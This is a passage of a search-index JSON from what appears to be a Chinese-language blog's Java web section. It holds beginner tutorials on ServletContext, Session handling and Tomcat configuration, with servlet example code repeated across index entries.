Servletcontext\u5bf9\u8c61,\u5b83\u4ee3\u8868\u4e86\u5f53\u524d\u7684web\u5e94\u7528; ServletContext\u7684\u4f5c\u7528 # \u5171\u4eab\u6570\u636e # package top.longlone.servlet ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.PrintWriter ; public class HelloServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { ServletContext context = this . getServletContext (); String username = \"Longlone\" ; context . setAttribute ( \"username\" , username ); PrintWriter writer = resp . getWriter (); writer . print ( \"Hello,\" + username ); } } package top.longlone.servlet ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.PrintWriter ; public class WelcomeServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { ServletContext context = this . getServletContext (); String username = ( String ) context . getAttribute ( \"username\" ); PrintWriter writer = resp . getWriter (); writer . print ( \"Welcome,\" + username ); } } \u5728HelloServlet\u4e2d\u4f7f\u7528ServletContext\u4fdd\u5b58\u7684\u6570\u636e\u53ef\u4ee5\u5728WelcomeServlet\u4e2d\u62ff\u5230\uff0c\u8fd9\u6837Servlet\u4e4b\u95f4\u5c31\u53ef\u4ee5\u5f88\u65b9\u4fbf\u5730\u5171\u4eab\u6570\u636e \u914d\u7f6e\u6587\u4ef6 # \u5728web.xml\u4e2d\u53ef\u4ee5\u8bbe\u7f6econtext-param <context-param> <param-name> databaseUrl </param-name> <param-value> jdbc:mysql://localhost:3306/mybatis </param-value> </context-param> \u7136\u540e\u5728ServletContext\u4e2d\u53ef\u4ee5\u8c03\u7528getInitParameter\u65b9\u6cd5\u62ff\u5230 package top.longlone.servlet ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.PrintWriter ; public class GetServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { ServletContext context = this . getServletContext (); String databaseUrl = ( String ) context . getInitParameter ( \"databaseUrl\" ); PrintWriter writer = resp . getWriter (); writer . print ( \"Database Url: \" + databaseUrl ); } } \u6240\u4ee5ServletContext\u4e5f\u53ef\u4ee5\u5145\u5f53\u4e00\u4e2a\u914d\u7f6e\u7c7b\uff0c\u53bb\u83b7\u53d6web.xml\u4e2d\u7684\u914d\u7f6e \u8bf7\u6c42\u8f6c\u53d1 # ServletContext\u4e5f\u53ef\u4ee5\u5c06\u8bf7\u6c42\u8f6c\u53d1\u5230\u53e6\u5916\u4e00\u4e2a\u8bf7\u6c42\u4e0a package top.longlone.servlet ; import javax.servlet.RequestDispatcher ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.PrintWriter ; public class ForwardServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { ServletContext context = this . getServletContext (); RequestDispatcher requestDispatcher = context . getRequestDispatcher ( \"/get\" ); requestDispatcher . forward ( req , resp ); } } \u4f8b\u5982\u4e0a\u9762\u7684\u4f8b\u5b50\uff0c\u5f53\u8bbf\u95eeForwardServlet\u7684\u65f6\u5019\uff0c\u5b9e\u9645\u4e0a\u4f1a\u5c06\u8bf7\u6c42\u8f6c\u53d1\u5230/get\u5bf9\u5e94\u7684GetServlet\u4e2d\uff0c\u54cd\u5e94\u7684\u5185\u5bb9\u81ea\u7136\u4e5f\u662fGetServlet\u7684\u54cd\u5e94 \u8bfb\u53d6\u8d44\u6e90\u6587\u4ef6 # \u5728resources\u6587\u4ef6\u5939\u4e2d\u5199\u5165db.properties username = root password = 123456 \u5f53tomcat\u542f\u52a8\u65f6\uff0cresources\u6587\u4ef6\u5939\u91cc\u7684\u6587\u4ef6\u5c06\u4f1a\u88ab\u6253\u5305\u5230\u9879\u76ee\u540d/WEB-INF/classes\u91cc \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7ServletContext\u83b7\u53d6\u8fd9\u4e2a\u8d44\u6e90\u6d41\uff0c\u7136\u540e\u4f7f\u7528Properties\u7c7b\u52a0\u8f7d\u8fd9\u4e2a\u8d44\u6e90\u6587\u4ef6 package top.longlone.servlet ; import javax.servlet.RequestDispatcher ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.InputStream ; import java.util.Properties ; public class ResourceServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { ServletContext context = this . getServletContext (); InputStream is = context . getResourceAsStream ( \"/WEB-INF/classes/db.properties\" ); Properties properties = new Properties (); properties . load ( is ); String usernanme = properties . getProperty ( \"username\" ); String password = properties . getProperty ( \"password\" ); resp . getWriter (). print ( usernanme + \":\" + password ); } } \u603b\u7ed3 # \u672c\u8282\u4e3b\u8981\u8bb2\u4e86\u4ec0\u4e48\u662fServletContext\u4ee5\u53ca\u5b83\u7684\u56db\u5927\u4f5c\u7528:\u5171\u4eab\u6570\u636e\uff0c \u914d\u7f6e\u6587\u4ef6\uff0c\u8bf7\u6c42\u8f6c\u53d1\uff0c\u8bfb\u53d6\u8d44\u6e90\u6587\u4ef6\u3002","title":"ServletContext"},{"location":"%E5%AE%89%E5%85%A8/java/web/ServletContext/#servletcontext","text":"ServletContext\uff0cServlet\u7684\u4e0a\u4e0b\u6587\u5bf9\u8c61\uff0cweb\u5bb9\u5668\u5728\u542f\u52a8\u7684\u65f6\u5019,\u5b83\u4f1a\u4e3a\u6bcf\u4e2aweb\u7a0b\u5e8f\u90fd\u521b\u5efa\u4e00\u4e2a\u5bf9\u5e94\u7684 Servletcontext\u5bf9\u8c61,\u5b83\u4ee3\u8868\u4e86\u5f53\u524d\u7684web\u5e94\u7528;","title":"ServletContext"},{"location":"%E5%AE%89%E5%85%A8/java/web/ServletContext/#servletcontext\u7684\u4f5c\u7528","text":"","title":"ServletContext\u7684\u4f5c\u7528"},{"location":"%E5%AE%89%E5%85%A8/java/web/ServletContext/#\u5171\u4eab\u6570\u636e","text":"package top.longlone.servlet ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.PrintWriter ; public class HelloServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { ServletContext context = this . getServletContext (); String username = \"Longlone\" ; context . setAttribute ( \"username\" , username ); PrintWriter writer = resp . getWriter (); writer . print ( \"Hello,\" + username ); } } package top.longlone.servlet ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.PrintWriter ; public class WelcomeServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { ServletContext context = this . getServletContext (); String username = ( String ) context . getAttribute ( \"username\" ); PrintWriter writer = resp . getWriter (); writer . print ( \"Welcome,\" + username ); } } \u5728HelloServlet\u4e2d\u4f7f\u7528ServletContext\u4fdd\u5b58\u7684\u6570\u636e\u53ef\u4ee5\u5728WelcomeServlet\u4e2d\u62ff\u5230\uff0c\u8fd9\u6837Servlet\u4e4b\u95f4\u5c31\u53ef\u4ee5\u5f88\u65b9\u4fbf\u5730\u5171\u4eab\u6570\u636e","title":"\u5171\u4eab\u6570\u636e"},{"location":"%E5%AE%89%E5%85%A8/java/web/ServletContext/#\u914d\u7f6e\u6587\u4ef6","text":"\u5728web.xml\u4e2d\u53ef\u4ee5\u8bbe\u7f6econtext-param <context-param> <param-name> databaseUrl </param-name> <param-value> jdbc:mysql://localhost:3306/mybatis </param-value> </context-param> \u7136\u540e\u5728ServletContext\u4e2d\u53ef\u4ee5\u8c03\u7528getInitParameter\u65b9\u6cd5\u62ff\u5230 package top.longlone.servlet ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.PrintWriter ; public class GetServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { ServletContext context = this . getServletContext (); String databaseUrl = ( String ) context . getInitParameter ( \"databaseUrl\" ); PrintWriter writer = resp . getWriter (); writer . print ( \"Database Url: \" + databaseUrl ); } } \u6240\u4ee5ServletContext\u4e5f\u53ef\u4ee5\u5145\u5f53\u4e00\u4e2a\u914d\u7f6e\u7c7b\uff0c\u53bb\u83b7\u53d6web.xml\u4e2d\u7684\u914d\u7f6e","title":"\u914d\u7f6e\u6587\u4ef6"},{"location":"%E5%AE%89%E5%85%A8/java/web/ServletContext/#\u8bf7\u6c42\u8f6c\u53d1","text":"ServletContext\u4e5f\u53ef\u4ee5\u5c06\u8bf7\u6c42\u8f6c\u53d1\u5230\u53e6\u5916\u4e00\u4e2a\u8bf7\u6c42\u4e0a package top.longlone.servlet ; import javax.servlet.RequestDispatcher ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.PrintWriter ; public class ForwardServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { ServletContext context = this . getServletContext (); RequestDispatcher requestDispatcher = context . getRequestDispatcher ( \"/get\" ); requestDispatcher . forward ( req , resp ); } } \u4f8b\u5982\u4e0a\u9762\u7684\u4f8b\u5b50\uff0c\u5f53\u8bbf\u95eeForwardServlet\u7684\u65f6\u5019\uff0c\u5b9e\u9645\u4e0a\u4f1a\u5c06\u8bf7\u6c42\u8f6c\u53d1\u5230/get\u5bf9\u5e94\u7684GetServlet\u4e2d\uff0c\u54cd\u5e94\u7684\u5185\u5bb9\u81ea\u7136\u4e5f\u662fGetServlet\u7684\u54cd\u5e94","title":"\u8bf7\u6c42\u8f6c\u53d1"},{"location":"%E5%AE%89%E5%85%A8/java/web/ServletContext/#\u8bfb\u53d6\u8d44\u6e90\u6587\u4ef6","text":"\u5728resources\u6587\u4ef6\u5939\u4e2d\u5199\u5165db.properties username = root password = 123456 \u5f53tomcat\u542f\u52a8\u65f6\uff0cresources\u6587\u4ef6\u5939\u91cc\u7684\u6587\u4ef6\u5c06\u4f1a\u88ab\u6253\u5305\u5230\u9879\u76ee\u540d/WEB-INF/classes\u91cc \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7ServletContext\u83b7\u53d6\u8fd9\u4e2a\u8d44\u6e90\u6d41\uff0c\u7136\u540e\u4f7f\u7528Properties\u7c7b\u52a0\u8f7d\u8fd9\u4e2a\u8d44\u6e90\u6587\u4ef6 package top.longlone.servlet ; import javax.servlet.RequestDispatcher ; import javax.servlet.ServletContext ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; import java.io.InputStream ; import java.util.Properties ; public class ResourceServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { ServletContext context = this . getServletContext (); InputStream is = context . getResourceAsStream ( \"/WEB-INF/classes/db.properties\" ); Properties properties = new Properties (); properties . load ( is ); String usernanme = properties . getProperty ( \"username\" ); String password = properties . getProperty ( \"password\" ); resp . getWriter (). print ( usernanme + \":\" + password ); } }","title":"\u8bfb\u53d6\u8d44\u6e90\u6587\u4ef6"},{"location":"%E5%AE%89%E5%85%A8/java/web/ServletContext/#\u603b\u7ed3","text":"\u672c\u8282\u4e3b\u8981\u8bb2\u4e86\u4ec0\u4e48\u662fServletContext\u4ee5\u53ca\u5b83\u7684\u56db\u5927\u4f5c\u7528:\u5171\u4eab\u6570\u636e\uff0c \u914d\u7f6e\u6587\u4ef6\uff0c\u8bf7\u6c42\u8f6c\u53d1\uff0c\u8bfb\u53d6\u8d44\u6e90\u6587\u4ef6\u3002","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/web/Session/","tags":["java"],"text":"Session # \u5728\u8ba1\u7b97\u673a\u4e2d\uff0c\u5c24\u5176\u662f\u5728\u7f51\u7edc\u5e94\u7528\u4e2d\uff0c\u79f0\u4e3a\u201c\u4f1a\u8bdd\u63a7\u5236\u201d\u3002Session\u5bf9\u8c61\u5b58\u50a8\u7279\u5b9a\u7528\u6237\u4f1a\u8bdd\u6240\u9700\u7684\u5c5e\u6027\u53ca\u914d\u7f6e\u4fe1\u606f\u3002\u8fd9\u6837\uff0c\u5f53\u7528\u6237\u5728\u5e94\u7528\u7a0b\u5e8f\u7684Web\u9875\u4e4b\u95f4\u8df3\u8f6c\u65f6\uff0c\u5b58\u50a8\u5728Session\u5bf9\u8c61\u4e2d\u7684\u53d8\u91cf\u5c06\u4e0d\u4f1a\u4e22\u5931\uff0c\u800c\u662f\u5728\u6574\u4e2a\u7528\u6237\u4f1a\u8bdd\u4e2d\u4e00\u76f4\u5b58\u5728\u4e0b\u53bb\u3002\u5f53\u7528\u6237\u8bf7\u6c42\u6765\u81ea\u5e94\u7528\u7a0b\u5e8f\u7684 Web\u9875\u65f6\uff0c\u5982\u679c\u8be5\u7528\u6237\u8fd8\u6ca1\u6709\u4f1a\u8bdd\uff0c\u5219Web\u670d\u52a1\u5668\u5c06\u81ea\u52a8\u521b\u5efa\u4e00\u4e2a Session\u5bf9\u8c61\u3002\u5f53\u4f1a\u8bdd\u8fc7\u671f\u6216\u88ab\u653e\u5f03\u540e\uff0c\u670d\u52a1\u5668\u5c06\u7ec8\u6b62\u8be5\u4f1a\u8bdd\u3002 \u793a\u4f8b\u4ee3\u7801 # package top.longlone.servlet ; import javax.servlet.ServletException ; import javax.servlet.ServletInputStream ; import javax.servlet.http.* ; import java.io.IOException ; import java.io.PrintWriter ; public class HelloServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { req . setCharacterEncoding ( \"UTF-8\" ); resp . setHeader ( \"Content-Type\" , \"text/html; charset=UTF-8\" ); PrintWriter out = resp . getWriter (); // \u83b7\u53d6session HttpSession session = req . getSession (); if ( session . isNew ()) { out . write ( \"\u83b7\u53d6Session\uff0cid: \" + String . valueOf ( session . getId ())); // \u8bbe\u7f6esession\u4e2d\u7684\u503c\uff0c\u8fd9\u91cc\u662fObject\u7c7b\u578b\uff0c\u53ef\u4ee5\u5b58\u4efb\u610f\u503c session . setAttribute ( \"name\" , \"Longlone\" ); } else { // \u83b7\u53d6session\u4e2d\u7684\u503c String name = ( String ) session . getAttribute ( \"name\" ); out . write ( \"\u8bfb\u53d6Session\uff0cSession\u7684name: \" + name ); } // \u9500\u6bc1session // session.invalidate(); } } \u8bbe\u7f6esession\u6709\u6548\u65f6\u95f4 # \u5728web.xml\u4e2d\u8bbe\u7f6esession\u6709\u6548\u65f6\u95f4(\u5206\u949f) <session-config> <session-timeout> 2 </session-timeout> </session-config> Cookie\u548cSession\u7684\u533a\u522b # session \u5728\u670d\u52a1\u5668\u7aef\uff0ccookie \u5728\u5ba2\u6237\u7aef cookie\u901a\u5e38\u7528\u4e8e\u5b58\u50a8\u4e0d\u592a\u91cd\u8981\u7684\u4fe1\u606f\uff0c\u56e0\u4e3a\u5176\u53ef\u4ee5\u88ab\u5ba2\u6237\u7aef\u4f2a\u9020\uff0c\u800csession\u901a\u5e38\u7528\u4e8e\u5b58\u50a8\u6bd4\u8f83\u91cd\u8981\u7684\u4fe1\u606f session \u9ed8\u8ba4\u88ab\u5b58\u5728\u670d\u52a1\u5668\u7684\u4e00\u4e2a\u6587\u4ef6\u91cc session \u7684\u8fd0\u884c\u4f9d\u8d56 session id\uff0c\u800c session id \u662f\u5b58\u5728 cookie \u4e2d\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u6d4f\u89c8\u5668\u7981\u7528\u4e86 cookie \uff0c\u540c\u65f6 session \u4e5f\u4f1a\u5931\u6548\uff08\u4f46\u662f\u53ef\u4ee5\u901a\u8fc7\u5176\u5b83\u65b9\u5f0f\u5b9e\u73b0\uff0c\u6bd4\u5982\u5728 url \u4e2d\u4f20\u9012 session_id\uff09 \u603b\u7ed3 # \u8fd9\u8282\u4e3b\u8981\u8bb2\u4e86\u4ec0\u4e48\u662fSession\u4ee5\u53caCookie\u548cSession\u7684\u533a\u522b\u3002","title":"Session"},{"location":"%E5%AE%89%E5%85%A8/java/web/Session/#session","text":"\u5728\u8ba1\u7b97\u673a\u4e2d\uff0c\u5c24\u5176\u662f\u5728\u7f51\u7edc\u5e94\u7528\u4e2d\uff0c\u79f0\u4e3a\u201c\u4f1a\u8bdd\u63a7\u5236\u201d\u3002Session\u5bf9\u8c61\u5b58\u50a8\u7279\u5b9a\u7528\u6237\u4f1a\u8bdd\u6240\u9700\u7684\u5c5e\u6027\u53ca\u914d\u7f6e\u4fe1\u606f\u3002\u8fd9\u6837\uff0c\u5f53\u7528\u6237\u5728\u5e94\u7528\u7a0b\u5e8f\u7684Web\u9875\u4e4b\u95f4\u8df3\u8f6c\u65f6\uff0c\u5b58\u50a8\u5728Session\u5bf9\u8c61\u4e2d\u7684\u53d8\u91cf\u5c06\u4e0d\u4f1a\u4e22\u5931\uff0c\u800c\u662f\u5728\u6574\u4e2a\u7528\u6237\u4f1a\u8bdd\u4e2d\u4e00\u76f4\u5b58\u5728\u4e0b\u53bb\u3002\u5f53\u7528\u6237\u8bf7\u6c42\u6765\u81ea\u5e94\u7528\u7a0b\u5e8f\u7684 Web\u9875\u65f6\uff0c\u5982\u679c\u8be5\u7528\u6237\u8fd8\u6ca1\u6709\u4f1a\u8bdd\uff0c\u5219Web\u670d\u52a1\u5668\u5c06\u81ea\u52a8\u521b\u5efa\u4e00\u4e2a Session\u5bf9\u8c61\u3002\u5f53\u4f1a\u8bdd\u8fc7\u671f\u6216\u88ab\u653e\u5f03\u540e\uff0c\u670d\u52a1\u5668\u5c06\u7ec8\u6b62\u8be5\u4f1a\u8bdd\u3002","title":"Session"},{"location":"%E5%AE%89%E5%85%A8/java/web/Session/#\u793a\u4f8b\u4ee3\u7801","text":"package top.longlone.servlet ; import javax.servlet.ServletException ; import javax.servlet.ServletInputStream ; import javax.servlet.http.* ; import java.io.IOException ; import java.io.PrintWriter ; public class HelloServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { req . setCharacterEncoding ( \"UTF-8\" ); resp . setHeader ( \"Content-Type\" , \"text/html; charset=UTF-8\" ); PrintWriter out = resp . getWriter (); // \u83b7\u53d6session HttpSession session = req . getSession (); if ( session . isNew ()) { out . write ( \"\u83b7\u53d6Session\uff0cid: \" + String . valueOf ( session . getId ())); // \u8bbe\u7f6esession\u4e2d\u7684\u503c\uff0c\u8fd9\u91cc\u662fObject\u7c7b\u578b\uff0c\u53ef\u4ee5\u5b58\u4efb\u610f\u503c session . setAttribute ( \"name\" , \"Longlone\" ); } else { // \u83b7\u53d6session\u4e2d\u7684\u503c String name = ( String ) session . getAttribute ( \"name\" ); out . write ( \"\u8bfb\u53d6Session\uff0cSession\u7684name: \" + name ); } // \u9500\u6bc1session // session.invalidate(); } }","title":"\u793a\u4f8b\u4ee3\u7801"},{"location":"%E5%AE%89%E5%85%A8/java/web/Session/#\u8bbe\u7f6esession\u6709\u6548\u65f6\u95f4","text":"\u5728web.xml\u4e2d\u8bbe\u7f6esession\u6709\u6548\u65f6\u95f4(\u5206\u949f) <session-config> <session-timeout> 2 </session-timeout> </session-config>","title":"\u8bbe\u7f6esession\u6709\u6548\u65f6\u95f4"},{"location":"%E5%AE%89%E5%85%A8/java/web/Session/#cookie\u548csession\u7684\u533a\u522b","text":"session \u5728\u670d\u52a1\u5668\u7aef\uff0ccookie \u5728\u5ba2\u6237\u7aef cookie\u901a\u5e38\u7528\u4e8e\u5b58\u50a8\u4e0d\u592a\u91cd\u8981\u7684\u4fe1\u606f\uff0c\u56e0\u4e3a\u5176\u53ef\u4ee5\u88ab\u5ba2\u6237\u7aef\u4f2a\u9020\uff0c\u800csession\u901a\u5e38\u7528\u4e8e\u5b58\u50a8\u6bd4\u8f83\u91cd\u8981\u7684\u4fe1\u606f session \u9ed8\u8ba4\u88ab\u5b58\u5728\u670d\u52a1\u5668\u7684\u4e00\u4e2a\u6587\u4ef6\u91cc session \u7684\u8fd0\u884c\u4f9d\u8d56 session id\uff0c\u800c session id \u662f\u5b58\u5728 cookie \u4e2d\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u6d4f\u89c8\u5668\u7981\u7528\u4e86 cookie \uff0c\u540c\u65f6 session \u4e5f\u4f1a\u5931\u6548\uff08\u4f46\u662f\u53ef\u4ee5\u901a\u8fc7\u5176\u5b83\u65b9\u5f0f\u5b9e\u73b0\uff0c\u6bd4\u5982\u5728 url \u4e2d\u4f20\u9012 session_id\uff09","title":"Cookie\u548cSession\u7684\u533a\u522b"},{"location":"%E5%AE%89%E5%85%A8/java/web/Session/#\u603b\u7ed3","text":"\u8fd9\u8282\u4e3b\u8981\u8bb2\u4e86\u4ec0\u4e48\u662fSession\u4ee5\u53caCookie\u548cSession\u7684\u533a\u522b\u3002","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/web/Tomcat/","tags":["java"],"text":"Tomcat # tomcat\u5b98\u7f51 \u5b89\u88c5tomcat # \u76f4\u63a5\u53bb\u5b98\u7f51\u4e0b\u8f7d\u7136\u540e\u5b89\u88c5\uff0c\u6216\u8005\u4f7f\u7528\u5305\u7ba1\u7406\u5668\u8fdb\u884c\u5b89\u88c5\u3002 \u542f\u52a8\uff0c\u5173\u95edTomcat # \u5728Tomcat/bin\u76ee\u5f55\u4e2d\u6709startup.sh/startup.bat\u811a\u672c\u7528\u4e8e\u542f\u52a8Tomcat\uff0cTomcat\u542f\u52a8\u540e\u9ed8\u8ba4\u5f00\u542f\u5728 http://127.0.0.1:8080 \u5728Tomcat/bin\u76ee\u5f55\u4e2d\u6709shutdown.sh/shutdown.bat\u811a\u672c\u7528\u4e8e\u5173\u95edTomcat Tomcat\u914d\u7f6e # \u76d1\u542c\u5730\u5740\u914d\u7f6e # \u4fee\u6539name\u5373\u53ef\uff0c\u9ed8\u8ba4\u662flocalhost\uff0c\u53ea\u80fd\u7531\u672c\u5730\u8bbf\u95ee\uff0c\u8fd9\u4e2aname\u4e5f\u53ef\u4ee5\u662f\u4e00\u4e2a\u57df\u540d\uff0c\u670d\u52a1\u5668\u542f\u52a8\u65f6\u4f1a\u4f18\u5148\u4ecehosts\u6587\u4ef6\u4e2d\u5bfb\u627e\u8fd9\u4e2a\u57df\u540d\u5e76\u6307\u5411\u5bf9\u5e94\u7684\u5730\u5740(\u5176\u5b9elocalhost\u4e5f\u662f\u8fd9\u4e2a\u9053\u7406\uff0c\u5728hosts\u4e2d\u76f4\u63a5\u6307\u5411\u4e86127.0.0.1\uff0c\u6240\u4ee5\u8fd9\u91ccname\u4e3alocalhost\u548cname\u4e3a127.0.0.1\u662f\u4e00\u6837\u7684) <Host name= \"localhost\" appBase= \"webapps\" unpackWARs= \"true\" autoDeploy= \"true\" > \u76d1\u542c\u7aef\u53e3\u914d\u7f6e # \u4fee\u6539port\u7aef\u53e3\u5373\u53ef\uff0c\u9ed8\u8ba4\u662f8080 <Connector port= \"8080\" protocol= \"HTTP/1.1\" connectionTimeout= \"20000\" redirectPort= \"8443\" /> web\u76ee\u5f55\u914d\u7f6e # \u4fee\u6539appBase\u5373\u53ef\uff0c\u9ed8\u8ba4\u662f\u5f53\u524d\u76ee\u5f55\u4e0b\u7684webapps\u76ee\u5f55 <Host name= \"localhost\" appBase= \"webapps\" unpackWARs= \"true\" autoDeploy= \"true\" > \u7f16\u5199web\u9875\u9762 # web\u76ee\u5f55\u9ed8\u8ba4\u5728webapps\u4e0b\uff0cROOT\u662f\u9ed8\u8ba4\u7684\u7f51\u7ad9\u6839\u76ee\u5f55\u4e0b\u7684\u5185\u5bb9\uff0c\u5176\u4ed6\u7684\u6587\u4ef6\u5939\u5bf9\u5e94\u7684\u5c31\u662f\u8bbf\u95ee\u7684\u8def\u5f84\uff0c\u4f8b\u5982examples\u6587\u4ef6\u5939\u4e0b\u7684\u5185\u5bb9\u9700\u8981\u901a\u8fc7 http://127.0.0.1:8080/examples/ \u8bbf\u95ee\u3002 \u6211\u4eec\u53ef\u4ee5\u5728webapps\u4e0b\u65b0\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u7136\u540e\u5199\u5165index.html(\u9ed8\u8ba4\u6253\u5f00\u7684\u9875\u9762)\uff0c\u542f\u52a8Tomcat\u670d\u52a1\u5668\u540e\u8bbf\u95ee\u5373\u53ef\u3002 \u6216\u8005\u6211\u4eec\u53ef\u4ee5\u53c2\u8003webapps/examples\u4e0b\u7684\u5185\u5bb9\u8fdb\u884c\u5b66\u4e60\uff0c\u91cc\u9762\u6709\u5f88\u591a\u5b98\u65b9\u7684\u4f8b\u5b50\u3002 IDEA\u4e2d\u4f7f\u7528Tomcat # \u521b\u5efaweb\u9879\u76ee # \u914d\u7f6eTomcat # \u70b9\u51fb\u53f3\u4e0a\u89d2\u7684ADD CONFIGURATION\u6dfb\u52a0\u914d\u7f6e \u70b9\u51fb\u5de6\u4e0a\u89d2\u7684\u52a0\u53f7\u5e76\u9009\u62e9Tomcat Server - Local \u7136\u540e\u53ef\u4ee5\u5bf9Tomcat\u8fdb\u884c\u4e00\u4e9b\u914d\u7f6e \u8fd8\u8981\u518dDeployment\u4e2d\u6dfb\u52a0artifacts\uff0c\u8fd9\u91ccApplication Context\u662f\u4e00\u4e2a\u8def\u5f84\u6620\u5c04\uff0c\u9ed8\u8ba4\u4e3a/\uff0c\u5373\u8bbf\u95ee http://127.0.0.1:8080/ \uff0c\u5982\u679c\u8bbe\u7f6e\u4e3a\u5176\u4ed6\u5185\u5bb9\u5982/test\uff0c\u5219\u8bbf\u95ee http://127.0.0.1:8080/test \u914d\u7f6e\u5b8c\u4e4b\u540e\u6574\u4e2a\u9879\u76ee\u7ed3\u6784\u5927\u6982\u662f\u8fd9\u6837 \u6700\u540e\u70b9\u51fb\u53f3\u4e0a\u89d2\u7684\u7eff\u8272\u8fd0\u884c\u7bad\u5934\u5373\u53ef \u603b\u7ed3 # \u672c\u8282\u4e3b\u8981\u4ecb\u7ecd\u4e86Tomcat\u7684\u5b89\u88c5\uff0c\u542f\u52a8\u548c\u914d\u7f6e\uff0c\u4ee5\u53caIDEA\u4e2dWeb\u9879\u76ee\u7684\u521b\u5efa\u4e0eTomcat\u7684\u914d\u7f6e","title":"Tomcat"},{"location":"%E5%AE%89%E5%85%A8/java/web/Tomcat/#tomcat","text":"tomcat\u5b98\u7f51","title":"Tomcat"},{"location":"%E5%AE%89%E5%85%A8/java/web/Tomcat/#\u5b89\u88c5tomcat","text":"\u76f4\u63a5\u53bb\u5b98\u7f51\u4e0b\u8f7d\u7136\u540e\u5b89\u88c5\uff0c\u6216\u8005\u4f7f\u7528\u5305\u7ba1\u7406\u5668\u8fdb\u884c\u5b89\u88c5\u3002","title":"\u5b89\u88c5tomcat"},{"location":"%E5%AE%89%E5%85%A8/java/web/Tomcat/#\u542f\u52a8\u5173\u95edtomcat","text":"\u5728Tomcat/bin\u76ee\u5f55\u4e2d\u6709startup.sh/startup.bat\u811a\u672c\u7528\u4e8e\u542f\u52a8Tomcat\uff0cTomcat\u542f\u52a8\u540e\u9ed8\u8ba4\u5f00\u542f\u5728 http://127.0.0.1:8080 \u5728Tomcat/bin\u76ee\u5f55\u4e2d\u6709shutdown.sh/shutdown.bat\u811a\u672c\u7528\u4e8e\u5173\u95edTomcat","title":"\u542f\u52a8\uff0c\u5173\u95edTomcat"},{"location":"%E5%AE%89%E5%85%A8/java/web/Tomcat/#tomcat\u914d\u7f6e","text":"","title":"Tomcat\u914d\u7f6e"},{"location":"%E5%AE%89%E5%85%A8/java/web/Tomcat/#\u76d1\u542c\u5730\u5740\u914d\u7f6e","text":"\u4fee\u6539name\u5373\u53ef\uff0c\u9ed8\u8ba4\u662flocalhost\uff0c\u53ea\u80fd\u7531\u672c\u5730\u8bbf\u95ee\uff0c\u8fd9\u4e2aname\u4e5f\u53ef\u4ee5\u662f\u4e00\u4e2a\u57df\u540d\uff0c\u670d\u52a1\u5668\u542f\u52a8\u65f6\u4f1a\u4f18\u5148\u4ecehosts\u6587\u4ef6\u4e2d\u5bfb\u627e\u8fd9\u4e2a\u57df\u540d\u5e76\u6307\u5411\u5bf9\u5e94\u7684\u5730\u5740(\u5176\u5b9elocalhost\u4e5f\u662f\u8fd9\u4e2a\u9053\u7406\uff0c\u5728hosts\u4e2d\u76f4\u63a5\u6307\u5411\u4e86127.0.0.1\uff0c\u6240\u4ee5\u8fd9\u91ccname\u4e3alocalhost\u548cname\u4e3a127.0.0.1\u662f\u4e00\u6837\u7684) <Host name= \"localhost\" appBase= 